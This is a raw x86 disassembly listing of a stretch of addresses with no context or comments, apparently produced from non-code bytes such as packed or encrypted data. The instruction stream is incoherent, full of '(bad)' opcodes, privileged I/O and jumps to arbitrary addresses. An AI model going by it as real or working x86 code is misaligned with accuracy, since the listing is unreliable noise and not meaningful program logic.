  40dc37:	popa   
  40dc38:	loopne 0x40dbd1
  40dc3a:	test   eax,0xe6569db0
  40dc3f:	lds    edi,FWORD PTR [ebx]
  40dc41:	sub    eax,0xdd1c8563
  40dc46:	pop    ebx
  40dc47:	out    dx,eax
  40dc48:	(bad)  [edi+0x39755636]
  40dc4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4f:	mov    ebp,0xce6d90f0
  40dc54:	mov    eax,ds:0x9dde3b22
  40dc59:	lea    ebx,[ecx+0x45bc1853]
  40dc5f:	pop    ecx
  40dc60:	sbb    al,0xc0
  40dc62:	std    
  40dc63:	lods   al,BYTE PTR ds:[esi]
  40dc64:	test   eax,0xddab6982
  40dc69:	stc    
  40dc6a:	adc    eax,0x2752dc1d
  40dc6f:	lea    esp,[edi+0x2e15dbc3]
  40dc75:	pop    edx
  40dc76:	fadd   QWORD PTR [ecx]
  40dc78:	rcl    BYTE PTR [ebp+esi*1-0x6e],cl
  40dc7c:	xor    cl,BYTE PTR [eax-0x6739e21d]
  40dc82:	mov    dl,0x2b
  40dc84:	push   esp
  40dc85:	add    al,0x94
  40dc87:	inc    ebp
  40dc88:	mov    ecx,ebp
  40dc8a:	sbb    bl,BYTE PTR [edx-0x56b8b9df]
  40dc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc91:	in     al,0xba
  40dc93:	iret   
  40dc94:	sbb    eax,DWORD PTR [esi-0x752f7e00]
  40dc9a:	out    0xc4,eax
  40dc9c:	push   cs
  40dc9d:	bound  edi,QWORD PTR [edx-0x547b8e02]
  40dca3:	mov    ah,0x36
  40dca5:	je     0x40dc51
  40dca7:	shl    esi,cl
  40dca9:	jb     0x40dcf2
  40dcab:	jmp    0x3401:0x5a7208e9
  40dcb2:	and    eax,DWORD PTR [edi-0x3]
  40dcb5:	and    eax,edx
  40dcb7:	or     al,0x67
  40dcb9:	sub    DWORD PTR es:[ecx],edi
  40dcbc:	lea    ebx,[ecx+0x17c45c62]
  40dcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc3:	pop    ds
  40dcc4:	push   ecx
  40dcc5:	aam    0x10
  40dcc7:	loopne 0x40dd05
  40dcc9:	das    
  40dcca:	push   edi
  40dccb:	jns    0x40dcee
  40dccd:	pop    ss
  40dcce:	push   0x1dc89f97
  40dcd3:	dec    ecx
  40dcd4:	push   0x3790ef4f
  40dcd9:	imul   esi,DWORD PTR [esi+ebp*2+0x36c75ee],0xffffffd9
  40dce1:	in     eax,dx
  40dce2:	ds inc esp
  40dce4:	shr    DWORD PTR [edx],cl
  40dce6:	push   edx
  40dce7:	test   eax,0x5ed0126b
  40dcec:	(bad)  [esi+eax*2]
  40dcef:	cmp    eax,0x65b356a
  40dcf4:	jmp    0x40dd5b
  40dcf6:	mov    ebx,0x860f8831
  40dcfb:	xchg   ecx,eax
  40dcfc:	jle    0x40dd13
  40dcfe:	nop
  40dcff:	cmp    eax,esp
  40dd01:	mov    DWORD PTR [esp+ebx*4],esi
  40dd04:	or     eax,0xb66f8f8d
  40dd09:	sub    ebx,DWORD PTR ds:0x8a85b70a
  40dd0f:	sub    DWORD PTR [ecx],0x8
  40dd12:	mov    ds:0x19f35344,al
  40dd17:	lds    ecx,FWORD PTR [ebp-0x79]
  40dd1a:	retf   
  40dd1b:	pop    ebp
  40dd1c:	push   ebx
  40dd1d:	pop    edx
  40dd1e:	ja     0x40dcda
  40dd20:	xchg   ebp,eax
  40dd21:	sub    DWORD PTR [eax],edi
  40dd23:	aad    0xcd
  40dd25:	int    0x50
  40dd27:	out    dx,eax
  40dd28:	ret    0xe0d3
  40dd2b:	daa    
  40dd2c:	mov    dl,0xd3
  40dd2e:	mov    edi,0x9d7c8f89
  40dd33:	mov    ch,0xb3
  40dd35:	fcomp  QWORD PTR [ebp+0x7e]
  40dd38:	inc    eax
  40dd39:	push   ds
  40dd3a:	inc    esi
  40dd3b:	mov    cl,bl
  40dd3d:	sbb    al,0xa9
  40dd3f:	jle    0x40dcea
  40dd41:	ja     0x40dd0f
  40dd43:	sub    DWORD PTR [esi],ecx
  40dd45:	xchg   ebp,eax
  40dd46:	jmp    0x711bec75
  40dd4b:	push   edx
  40dd4c:	pop    esp
  40dd4d:	pop    edi
  40dd4e:	loop   0x40dcfb
  40dd50:	pop    eax
  40dd51:	jge    0x40ddc0
  40dd53:	inc    eax
  40dd54:	bound  eax,QWORD PTR [edi+ecx*8+0x34075068]
  40dd5b:	dec    esi
  40dd5c:	sbb    eax,0x66f3bcb3
  40dd61:	mov    ah,0x75
  40dd63:	mov    ds:0x819ad5ea,al
  40dd68:	xchg   edx,eax
  40dd69:	push   edx
  40dd6a:	adc    eax,0xb49be230
  40dd6f:	outs   dx,DWORD PTR ds:[esi]
  40dd70:	xchg   edi,eax
  40dd71:	push   esi
  40dd72:	mov    eax,0xdf0132a3
  40dd77:	cmp    DWORD PTR [ebp-0x21c15627],esi
  40dd7d:	mov    edx,0xa179b669
  40dd82:	mov    WORD PTR [edi+eiz*1+0x9],ds
  40dd86:	push   cs
  40dd87:	cmc    
  40dd88:	dec    eax
  40dd89:	int3   
  40dd8a:	ror    DWORD PTR [esp+eiz*4-0x1c],0xbc
  40dd8f:	sahf   
  40dd90:	jae    0x40ddd0
  40dd92:	cmp    DWORD PTR [edx-0x9],ecx
  40dd95:	mov    dl,0x59
  40dd97:	dec    esi
  40dd98:	cmp    bh,BYTE PTR [esp+edx*1+0x2e]
  40dd9c:	lahf   
  40dd9d:	dec    ebp
  40dd9e:	xlat   BYTE PTR ds:[ebx]
  40dd9f:	inc    ebx
  40dda0:	(bad)  
  40dda1:	push   0x57
  40dda3:	xchg   ebp,eax
  40dda4:	cs jno 0x40de20
  40dda7:	or     bl,BYTE PTR [ecx]
  40dda9:	daa    
  40ddaa:	int    0x6
  40ddac:	inc    esi
  40ddad:	ds nop
  40ddaf:	jbe    0x40dd7f
  40ddb1:	pop    ebp
  40ddb2:	jns    0x40dd7c
  40ddb4:	push   edx
  40ddb5:	rcr    DWORD PTR [edi],1
  40ddb7:	shr    BYTE PTR [edx+0x22],cl
  40ddba:	mov    DWORD PTR [ebx-0x76575915],esi
  40ddc0:	adc    al,0xc
  40ddc2:	mov    eax,ds:0x807c94e
  40ddc7:	mov    ch,0xc2
  40ddc9:	pop    ds
  40ddca:	pop    ebx
  40ddcb:	xchg   edx,eax
  40ddcc:	inc    esp
  40ddcd:	jg     0x40ddf4
  40ddcf:	gs push 0xffffffbf
  40ddd2:	call   0x91ae0775
  40ddd7:	inc    ecx
  40ddd8:	xor    eax,0xbba03730
  40dddd:	arpl   dx,bx
  40dddf:	cli    
  40dde0:	sub    eax,0x3e1695b9
  40dde5:	pusha  
  40dde6:	mov    WORD PTR [edx+0x3bb6e360],?
  40ddec:	shl    DWORD PTR [edi-0x2f16d79c],1
  40ddf2:	dec    ebp
  40ddf3:	mov    ecx,0xeadc366e
  40ddf8:	je     0x40dd81
  40ddfa:	xchg   esp,eax
  40ddfb:	push   esp
  40ddfc:	xchg   ecx,eax
  40ddfd:	push   edi
  40ddfe:	jne    0x40de0a
  40de00:	mov    bh,0x51
  40de02:	or     al,0xe
  40de04:	(bad)  
  40de05:	jp     0x40de49
  40de07:	fstp   QWORD PTR [edi]
  40de09:	cmp    dl,dh
  40de0b:	pop    edi
  40de0c:	in     al,0x3c
  40de0e:	rcl    BYTE PTR [ebx-0x6e0fd491],cl
  40de14:	or     DWORD PTR [edx+0x4e366a10],ebp
  40de1a:	inc    edi
  40de1b:	xor    al,0x83
  40de1d:	lea    eax,[edi-0x7]
  40de20:	jl     0x40de52
  40de22:	ds dec ecx
  40de24:	inc    ebp
  40de25:	cmp    BYTE PTR [edx+esi*1-0x26169193],0x9
  40de2d:	rcr    al,0xd5
  40de30:	push   edx
  40de31:	and    dh,bh
  40de33:	sbb    al,0x8a
  40de35:	jne    0x40ddf9
  40de37:	mov    edi,0x61db9e1
  40de3c:	sub    eax,0x52b54947
  40de41:	xor    eax,0xf54f30bd
  40de46:	mov    ds:0x7f5833d8,eax
  40de4b:	and    al,0x47
  40de4d:	mov    ebx,0x797c9a7c
  40de52:	jb     0x40dde7
  40de54:	mov    ch,0x22
  40de56:	retf   
  40de57:	push   esi
  40de58:	cmp    eax,esp
  40de5a:	fiadd  WORD PTR [ebx-0x2eaa42c]
  40de60:	fnsave [ebx+0x204cb04c]
  40de66:	lods   eax,DWORD PTR ds:[esi]
  40de67:	fstp   TBYTE PTR [edi]
  40de69:	adc    ch,dh
  40de6b:	cmp    ebx,DWORD PTR [edi+0xb7a4de9]
  40de71:	int    0x87
  40de73:	xor    BYTE PTR [ecx],bh
  40de75:	push   ebx
  40de76:	jmp    DWORD PTR [eax+0x60]
  40de79:	es inc ebp
  40de7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de7c:	push   ds
  40de7d:	adc    eax,0x85f7e2fd
  40de82:	call   0x51c1283d
  40de87:	stc    
  40de88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de89:	test   DWORD PTR [ebp-0x4f],esi
  40de8c:	loopne 0x40de0f
  40de8e:	dec    edi
  40de8f:	pop    edi
  40de90:	scas   al,BYTE PTR es:[edi]
  40de91:	add    eax,0x69f489f9
  40de96:	or     edi,DWORD PTR [edi+0x3f]
  40de99:	push   0x90c4885d
  40de9e:	or     eax,0x395b54b8
  40dea3:	mov    cl,0xf1
  40dea5:	loop   0x40de65
  40dea7:	sub    dh,BYTE PTR [ecx-0x2e386396]
  40dead:	gs pop edi
  40deaf:	outs   dx,DWORD PTR ds:[esi]
  40deb0:	xchg   ecx,eax
  40deb1:	jne    0x40ded5
  40deb3:	scas   al,BYTE PTR es:[edi]
  40deb4:	mov    bh,0x11
  40deb6:	adc    bh,ch
  40deb8:	mov    ds:0xf3a15ae7,al
  40debd:	rol    BYTE PTR [esi-0x42c1ca34],1
  40dec3:	shl    edi,0x35
  40dec6:	xlat   BYTE PTR ds:[ebx]
  40dec7:	dec    edi
  40dec8:	xchg   ebx,eax
  40dec9:	in     eax,0xe8
  40decb:	repnz mov gs,WORD PTR [ecx]
  40dece:	cmp    ebp,DWORD PTR [ebx]
  40ded0:	sub    eax,0x70ee1732
  40ded5:	(bad)  
  40ded6:	dec    ebp
  40ded7:	in     al,dx
  40ded8:	adc    DWORD PTR [ecx-0x75ee3635],esi
  40dede:	je     0x40debd
  40dee0:	inc    esp
  40dee1:	mov    edx,0x2c73f21
  40dee6:	in     eax,dx
  40dee7:	sbb    cl,al
  40dee9:	cli    
  40deea:	scas   eax,DWORD PTR es:[edi]
  40deeb:	sub    al,0x23
  40deed:	and    eax,DWORD PTR [ecx+0x57]
  40def0:	push   0x58
  40def2:	push   ss
  40def3:	mov    DWORD PTR [edx-0x41e0225c],ebp
  40def9:	mov    dh,0xa
  40defb:	push   ss
  40defc:	lahf   
  40defd:	push   es
  40defe:	shl    BYTE PTR [esi-0x2b],cl
  40df01:	jbe    0x40df61
  40df03:	in     al,dx
  40df04:	out    dx,al
  40df05:	or     WORD PTR [esi+edx*4],0xff97
  40df0a:	push   ss
  40df0b:	mov    eax,0xc98b6c44
  40df10:	xlat   BYTE PTR ds:[ebx]
  40df11:	test   BYTE PTR [ebp+0x32c18f28],cl
  40df17:	push   edx
  40df18:	mov    dl,0xa4
  40df1a:	scas   eax,DWORD PTR es:[edi]
  40df1b:	add    BYTE PTR [esi+eiz*2],cl
  40df1e:	pop    es
  40df1f:	fiadd  WORD PTR [ebp-0x24]
  40df22:	adc    eax,0x6d7b506a
  40df27:	xor    DWORD PTR [ecx+0xf13972d],ebx
  40df2d:	stos   DWORD PTR es:[edi],eax
  40df2e:	les    ebx,FWORD PTR [esi]
  40df30:	dec    ebp
  40df31:	mov    edi,0xb2fd08e2
  40df36:	sub    al,0x2b
  40df38:	test   eax,0x3dbe8360
  40df3d:	jmp    0x281bea2a
  40df42:	call   0xd65b:0x7ab4a215
  40df49:	test   BYTE PTR [si+0x50],ch
  40df4d:	dec    edx
  40df4e:	ret    
  40df4f:	stc    
  40df50:	stos   DWORD PTR es:[edi],eax
  40df51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df52:	in     eax,dx
  40df53:	mov    esp,ecx
  40df55:	mov    ah,0xcc
  40df57:	cmp    BYTE PTR [esi],0xe4
  40df5a:	(bad)
  40df5e:	xchg   ebx,eax
  40df5f:	or     ecx,esi
  40df61:	ja     0x40df41
  40df63:	dec    edi
  40df64:	inc    ebx
  40df65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df66:	mov    cl,0x73
  40df68:	stos   DWORD PTR es:[edi],eax
  40df69:	xchg   DWORD PTR [edi-0x73],edi
  40df6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df6d:	dec    edx
  40df6e:	bound  ecx,QWORD PTR [ebx-0x3d597eb5]
  40df74:	xchg   BYTE PTR [edi+0x19cbbef7],al
  40df7a:	mov    al,0xb7
  40df7c:	loopne 0x40df31
  40df7e:	pop    ds
  40df7f:	aad    0xf5
  40df81:	xlat   BYTE PTR ss:[ebx]
  40df83:	push   cs
  40df84:	sub    eax,0xeb8f98a9
  40df89:	neg    BYTE PTR [ebp+0x4]
  40df8c:	stos   DWORD PTR es:[edi],eax
  40df8d:	loop   0x40df41
  40df8f:	pusha  
  40df90:	adc    DWORD PTR [edx-0x6381e35a],esp
  40df96:	xor    DWORD PTR [eax],eax
  40df98:	hlt    
  40df99:	xchg   ebx,eax
  40df9a:	ds repz cmp bh,dl
  40df9e:	fadd   DWORD PTR [esi]
  40dfa0:	scas   al,BYTE PTR es:[edi]
  40dfa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa2:	adc    eax,0x66a3b36d
  40dfa7:	jl     0x40dfcf
  40dfa9:	dec    edi
  40dfaa:	sub    al,0x78
  40dfac:	cmp    DWORD PTR [ebp+0x2556061f],esp
  40dfb2:	add    BYTE PTR [ebp-0x44a47281],0xc6
  40dfb9:	call   0x7261e549
  40dfbe:	mov    dh,0x60
  40dfc0:	(bad)  
  40dfc1:	jecxz  0x40dff9
  40dfc3:	jp     0x40df4b
  40dfc5:	and    esp,DWORD PTR [ecx]
  40dfc7:	lds    ecx,FWORD PTR [eax-0x3ce0b070]
  40dfcd:	sbb    esi,DWORD PTR [edi-0x1b8ff456]
  40dfd3:	ret    0x1f0e
  40dfd6:	call   0x80df20cb
  40dfdb:	push   esi
  40dfdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfdd:	jmp    0xa28affad
  40dfe2:	ss dec esp
  40dfe4:	fs jb  0x40e040
  40dfe7:	sbb    eax,0x9021a4c0
  40dfec:	jno    0x40df80
  40dfee:	arpl   sp,cx
  40dff0:	ret    
  40dff1:	into   
  40dff2:	std    
  40dff3:	sbb    ebp,DWORD PTR [edi+0x606e37ba]
  40dff9:	(bad)  
  40dffa:	clc    
  40dffb:	push   0xffffffb9
  40dffd:	sbb    eax,0x7bf82361
  40e002:	(bad)  
  40e003:	xchg   esp,eax
  40e004:	ds mov ?,ebp
  40e007:	adc    ah,BYTE PTR [ecx+0x722abd5d]
  40e00d:	adc    al,BYTE PTR [eax+eiz*2]
  40e010:	aaa    
  40e011:	jp     0x40dff3
  40e013:	ss mov al,0x7b
  40e016:	mov    edx,0x3f0b9aa5
  40e01b:	lock add ecx,DWORD PTR [edx]
  40e01e:	cmp    DWORD PTR [edi-0x56400983],0xec3779c3
  40e028:	push   eax
  40e029:	xchg   BYTE PTR ds:0xe2c0bd1e,ah
  40e02f:	sbb    eax,DWORD PTR [edi-0x67]
  40e032:	mov    edi,edi
  40e034:	xor    eax,0x298b7cd6
  40e039:	loopne 0x40dfbd
  40e03b:	dec    edx
  40e03c:	push   edi
  40e03d:	aad    0xd3
  40e03f:	sub    al,0xb4
  40e041:	mov    bh,0x4d
  40e043:	sahf   
  40e044:	jb     0x40dfd3
  40e046:	inc    edx
  40e047:	jmp    0x40e04a
  40e049:	fwait
  40e04a:	lock and ebx,DWORD PTR [esi-0x18cf2784]
  40e051:	gs pop edi
  40e053:	addr16 xchg ecx,eax
  40e055:	mov    al,0xa3
  40e057:	retf   0xe498
  40e05a:	in     eax,0xd
  40e05c:	mov    cl,0xc3
  40e05e:	jne    0x40e0af
  40e060:	sbb    BYTE PTR ds:0xe9324a3e,0x80
  40e067:	push   esi
  40e068:	and    DWORD PTR [ecx+0x2ce18462],ebp
  40e06e:	mov    ebp,0xd7b9c714
  40e073:	pop    eax
  40e074:	retf   
  40e075:	xchg   ebp,eax
  40e076:	xchg   edi,eax
  40e077:	pshufw mm3,QWORD PTR [edi-0x4d5ce36],0xb0
  40e07f:	into   
  40e080:	pop    ss
  40e081:	pop    edi
  40e082:	iret   
  40e083:	les    ebx,FWORD PTR [edi-0x9ff044b]
  40e089:	mov    bh,0x5b
  40e08b:	cmp    DWORD PTR [eax+0x61d7ef83],esp
  40e091:	cmp    eax,0x693f6fc9
  40e096:	leave  
  40e097:	xor    eax,0xfd0f541
  40e09c:	xchg   esp,eax
  40e09d:	retf   0x5fd4
  40e0a0:	jmp    0x8a0d3d5a
  40e0a5:	push   ss
  40e0a6:	stos   DWORD PTR es:[edi],eax
  40e0a7:	cld    
  40e0a8:	pusha  
  40e0a9:	hlt    
  40e0aa:	outs   dx,BYTE PTR ds:[esi]
  40e0ab:	loop   0x40e07e
  40e0ad:	retf   
  40e0ae:	fcmovnu st,st(1)
  40e0b0:	in     eax,0xcf
  40e0b2:	pop    esp
  40e0b3:	jle    0x40e0c1
  40e0b5:	or     DWORD PTR es:[edi+0x156c07ba],esp
  40e0bc:	pop    ss
  40e0bd:	mov    DWORD PTR [edi],ebp
  40e0bf:	jb     0x40e12a
  40e0c1:	aas    
  40e0c2:	scas   ax,WORD PTR es:[edi]
  40e0c4:	in     eax,dx
  40e0c5:	push   ds
  40e0c6:	ffreep st(3)
  40e0c8:	mov    WORD PTR [eax],fs
  40e0ca:	(bad)  
  40e0cb:	fbstp  TBYTE PTR [edi+0x77]
  40e0ce:	inc    ebp
  40e0cf:	cmp    BYTE PTR [ebp-0x28c551f6],ch
  40e0d5:	or     DWORD PTR ds:0xc7e61e54,ebp
  40e0db:	xchg   ebp,eax
  40e0dc:	in     eax,dx
  40e0dd:	xor    BYTE PTR [ebp+0x45546cf4],al
  40e0e3:	sbb    DWORD PTR [ebx+0x5285e932],ecx
  40e0e9:	arpl   WORD PTR [ecx],sp
  40e0eb:	ins    DWORD PTR es:[edi],dx
  40e0ec:	cs jmp edi
  40e0ef:	pop    ss
  40e0f0:	in     al,0x74
  40e0f2:	add    bl,BYTE PTR [edx+0x8f72fe9]
  40e0f8:	xchg   edi,eax
  40e0f9:	push   edi
  40e0fa:	cld    
  40e0fb:	push   ebx
  40e0fc:	inc    ecx
  40e0fd:	inc    esi
  40e0fe:	(bad)  
  40e0ff:	loope  0x40e0a0
  40e101:	mov    ebx,0xf573a196
  40e106:	xor    eax,0x1bbe6586
  40e10b:	sub    edi,DWORD PTR [edi]
  40e10d:	mov    bl,0x24
  40e10f:	enter  0x1440,0xca
  40e113:	dec    esp
  40e114:	dec    ebp
  40e115:	lea    esi,[ebx-0xb]
  40e118:	stos   DWORD PTR es:[edi],eax
  40e119:	pop    edx
  40e11a:	mov    eax,0x8e8c261e
  40e11f:	jmp    0x35cedd4
  40e124:	test   eax,0x7498ccd0
  40e129:	sbb    esp,DWORD PTR [edi+0x19]
  40e12c:	jbe    0x40e171
  40e12e:	sub    BYTE PTR [edi],al
  40e130:	sub    DWORD PTR [ecx-0x218d1b44],edx
  40e136:	and    esp,DWORD PTR [ebx+ecx*4]
  40e139:	jle    0x40e0ef
  40e13b:	fidivr WORD PTR [ebx+0xc]
  40e13e:	jbe    0x40e162
  40e140:	lock enter 0x3315,0x18
  40e145:	and    al,0xb2
  40e147:	lods   al,BYTE PTR ds:[esi]
  40e148:	out    dx,al
  40e149:	call   0x4e51:0x6754
  40e14f:	mov    ah,0x9c
  40e151:	into   
  40e152:	jmp    0x6fc5f40c
  40e157:	popa   
  40e158:	cmp    DWORD PTR [ecx+0x311ee356],eax
  40e15e:	les    esp,FWORD PTR [edx-0x37]
  40e161:	jbe    0x40e15e
  40e163:	and    DWORD PTR [ebx-0x47c774c3],eax
  40e169:	data16 xchg bp,ax
  40e16c:	add    BYTE PTR [ebp+0x754e691f],ah
  40e172:	xor    al,0x94
  40e174:	data16 fld TBYTE PTR [edi+0x61c3f275]
  40e17b:	xchg   BYTE PTR [ebx-0x43],al
  40e17e:	pop    edx
  40e17f:	pop    eax
  40e180:	icebp  
  40e181:	sbb    eax,0xb192be01
  40e186:	push   cs
  40e187:	jge    0x40e205
  40e189:	das    
  40e18a:	mov    dl,0xe5
  40e18c:	mov    cl,0xee
  40e18e:	xor    ecx,DWORD PTR [ebx]
  40e190:	mov    WORD PTR [eax-0x55],?
  40e193:	aas    
  40e194:	push   esp
  40e195:	jmp    0x76e22fb8
  40e19a:	shl    BYTE PTR [edx+eax*1],1
  40e19d:	jne    0x40e120
  40e19f:	xor    edx,DWORD PTR [ecx+edi*8-0x36]
  40e1a3:	or     ecx,ebx
  40e1a5:	jns    0x40e143
  40e1a7:	xchg   edx,eax
  40e1a8:	mov    DWORD PTR [eax+0x31],edi
  40e1ab:	enter  0xcf67,0xc1
  40e1af:	aaa    
  40e1b0:	push   edi
  40e1b1:	inc    eax
  40e1b2:	hlt    
  40e1b3:	lods   eax,DWORD PTR ds:[esi]
  40e1b4:	push   es
  40e1b5:	add    eax,0x833b263e
  40e1ba:	push   ds
  40e1bb:	adc    ah,BYTE PTR [edi-0x182fa0a6]
  40e1c1:	arpl   WORD PTR [edi-0x78],cx
  40e1c4:	mov    ah,0x5
  40e1c6:	add    edi,edx
  40e1c8:	jo     0x40e1cc
  40e1ca:	jns    0x40e17b
  40e1cc:	retf   
  40e1cd:	sbb    DWORD PTR [eax+0x4a],edx
  40e1d0:	add    al,bl
  40e1d2:	test   eax,0xbcc6aa5b
  40e1d7:	jmp    0xd8bf5c24
  40e1dc:	ins    BYTE PTR es:[edi],dx
  40e1dd:	int3   
  40e1de:	xchg   BYTE PTR [edi+0x34],dl
  40e1e1:	pop    esi
  40e1e2:	xchg   ecx,eax
  40e1e3:	xchg   edx,eax
  40e1e4:	mov    eax,0xe6fc2065
  40e1e9:	sub    ch,BYTE PTR [edi+eax*4-0x2c]
  40e1ed:	outs   dx,DWORD PTR ds:[esi]
  40e1ee:	or     ecx,edx
  40e1f0:	ret    0xd2fd
  40e1f3:	inc    ebx
  40e1f4:	daa    
  40e1f5:	mov    esi,0xcb4d50c2
  40e1fa:	jle    0x40e27b
  40e1fc:	and    eax,0x561c8f4f
  40e201:	or     bl,cl
  40e203:	cmp    BYTE PTR [ebx],0xe0
  40e206:	jno    0x40e282
  40e208:	sbb    bl,BYTE PTR ds:0xdbc17980
  40e20e:	dec    esi
  40e20f:	out    dx,al
  40e210:	(bad)  [edx-0x4830ebd3]
  40e216:	std    
  40e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e218:	jmp    DWORD PTR [esi+edi*8+0x24]
  40e21c:	or     al,0x25
  40e21e:	lock mov ds:0xe50eea84,eax
  40e224:	mov    dl,0xb5
  40e226:	pop    ebx
  40e227:	and    eax,0xc8a2aeb0
  40e22c:	or     eax,0x961d73e3
  40e231:	mov    ebx,0x289b393d
  40e236:	mov    ebx,0xa47d7d7c
  40e23b:	jmp    0x40e1f4
  40e23d:	mov    dh,0x1c
  40e23f:	inc    ebx
  40e240:	adc    al,0x9a
  40e242:	and    BYTE PTR [edi],al
  40e244:	loope  0x40e231
  40e246:	mov    WORD PTR [edx-0x32],es
  40e249:	lahf   
  40e24a:	pop    ebx
  40e24b:	es dec eax
  40e24d:	add    al,0xbb
  40e24f:	sbb    eax,DWORD PTR ds:0xa63b5b57
  40e255:	mov    bl,0x5a
  40e257:	rol    DWORD PTR [eax+ebx*8+0x1ae055d5],cl
  40e25e:	dec    esp
  40e25f:	in     al,0xc3
  40e261:	jp     0x40e1e5
  40e263:	lods   eax,DWORD PTR ds:[esi]
  40e264:	dec    ebp
  40e265:	xchg   esp,eax
  40e266:	aad    0xeb
  40e268:	out    dx,al
  40e269:	push   ebp
  40e26a:	sbb    BYTE PTR [ecx+ecx*4+0x7d93bb59],ah
  40e271:	shr    BYTE PTR [edi+0x30dbb543],1
  40e277:	mov    al,ds:0x2fb4c472
  40e27c:	or     al,0xb3
  40e27e:	push   0xffffffe5
  40e280:	jnp    0x40e2fd
  40e282:	or     eax,DWORD PTR [ebx+edx*8]
  40e285:	mov    cl,ch
  40e287:	inc    dx
  40e289:	gs icebp 
  40e28b:	cli    
  40e28c:	mov    ebx,0x69b75256
  40e291:	int3   
  40e292:	lods   eax,DWORD PTR ds:[esi]
  40e293:	pop    ds
  40e294:	mov    DWORD PTR [ebp+0x4850194a],edx
  40e29a:	push   DWORD PTR [ecx]
  40e29c:	or     eax,0xc8b13d12
  40e2a1:	push   edx
  40e2a2:	iret   
  40e2a3:	pop    edi
  40e2a4:	jle    0x40e31c
  40e2a6:	shl    DWORD PTR [ecx],cl
  40e2a8:	or     ah,BYTE PTR [ebx+0x34]
  40e2ab:	and    al,0xbd
  40e2ad:	lds    esi,FWORD PTR [esi-0xf]
  40e2b0:	jbe    0x40e295
  40e2b2:	pop    edx
  40e2b3:	mov    esp,0x420a33d5
  40e2b8:	dec    edx
  40e2b9:	or     al,0xf4
  40e2bb:	push   eax
  40e2bc:	pop    esi
  40e2bd:	jle    0x40e276
  40e2bf:	shr    DWORD PTR [ebp-0x21],0xb
  40e2c3:	adc    bl,BYTE PTR [ecx+0x6786619b]
  40e2c9:	jbe    0x40e27b
  40e2cb:	daa    
  40e2cc:	add    BYTE PTR [edx+0x37e0bd94],al
  40e2d2:	dec    ecx
  40e2d3:	pop    ebx
  40e2d4:	jno    0x40e2a6
  40e2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2d7:	bound  edx,QWORD PTR [ebp-0x28d74cdc]
  40e2dd:	jp     0x40e302
  40e2df:	(bad)
  40e2e2:	and    DWORD PTR ds:0x13530949,edx
  40e2e8:	cmp    bl,BYTE PTR [edi-0x5c]
  40e2eb:	xlat   BYTE PTR ds:[ebx]
  40e2ec:	push   ebx
  40e2ed:	mov    ds:0xfe6598f3,al
  40e2f2:	add    BYTE PTR [ebp+0x74],ah
  40e2f5:	xor    edi,DWORD PTR [ecx+0x1a]
  40e2f8:	ds jmp 0x40e2ef
  40e2fb:	mov    esp,edx
  40e2fd:	xchg   esi,eax
  40e2fe:	push   cs
  40e2ff:	fxch   st(2)
  40e301:	out    dx,eax
  40e302:	jmp    0x711b8a14
  40e307:	cmp    eax,0xbd987339
  40e30c:	jno    0x40e2b6
  40e30e:	adc    al,BYTE PTR [eax]
  40e310:	les    eax,FWORD PTR [ecx-0x5e]
  40e313:	fnstsw WORD PTR [esp+ebp*2-0x6c]
  40e317:	stc    
  40e318:	xchg   esp,eax
  40e319:	dec    esi
  40e31a:	push   es
  40e31b:	mov    al,ds:0x8f633094
  40e320:	iret   
  40e321:	inc    esi
  40e322:	out    0xdf,eax
  40e324:	push   esi
  40e325:	pop    edi
  40e326:	test   BYTE PTR [eax-0x51],0xde
  40e32a:	call   0x8596:0x3dc2e7d2
  40e331:	mov    ebp,0xa9e60d35
  40e336:	aad    0xdb
  40e338:	and    al,0x84
  40e33a:	sbb    al,BYTE PTR [edx-0x1820ac97]
  40e340:	jecxz  0x40e373
  40e342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e343:	out    0x41,al
  40e345:	cs jae 0x40e2df
  40e348:	cmp    edx,ecx
  40e34a:	faddp  st(5),st
  40e34c:	lds    ax,DWORD PTR [edi]
  40e34f:	dec    ebp
  40e350:	dec    edx
  40e351:	cs sbb eax,0xbb64c58a
  40e357:	and    bl,al
  40e359:	fist   DWORD PTR [esp+esi*4-0x44]
  40e35d:	inc    edi
  40e35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e35f:	je     0x40e38c
  40e361:	ins    BYTE PTR es:[edi],dx
  40e362:	and    DWORD PTR [ecx+ebp*2],0x560fd842
  40e369:	nop
  40e36a:	outs   dx,DWORD PTR ds:[esi]
  40e36b:	xchg   edx,eax
  40e36c:	jno    0x40e360
  40e36e:	bound  eax,QWORD PTR [edi]
  40e370:	sub    esi,DWORD PTR [edx-0x337fc457]
  40e376:	xor    ebp,edi
  40e378:	and    DWORD PTR [ebx+0x3bdc1437],esi
  40e37e:	push   ss
  40e37f:	cli    
  40e380:	push   0xffffffef
  40e382:	sub    al,dl
  40e384:	iret   
  40e385:	and    ch,BYTE PTR [ecx+0x63]
  40e388:	int    0x5
  40e38a:	cmc    
  40e38b:	repz push 0x5979894e
  40e391:	fadd   QWORD PTR [ebx+esi*4+0x320c1fc3]
  40e398:	add    DWORD PTR ds:[ecx+0xf],0xe5efec35
  40e3a0:	sub    al,0x43
  40e3a2:	inc    edi
  40e3a3:	iret   
  40e3a4:	mov    edx,0x6f785b3a
  40e3a9:	xchg   ebp,eax
  40e3aa:	(bad)  
  40e3ac:	cmp    BYTE PTR [eax+ebx*8+0x93eea42],dl
  40e3b3:	fild   QWORD PTR ds:0xb8bae804
  40e3b9:	pop    esi
  40e3ba:	(bad)  
  40e3bb:	in     al,dx
  40e3bc:	test   eax,0xa5fbf44a
  40e3c1:	and    BYTE PTR [edi-0x4b],cl
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	mov    esi,DWORD PTR [ecx+0x12]
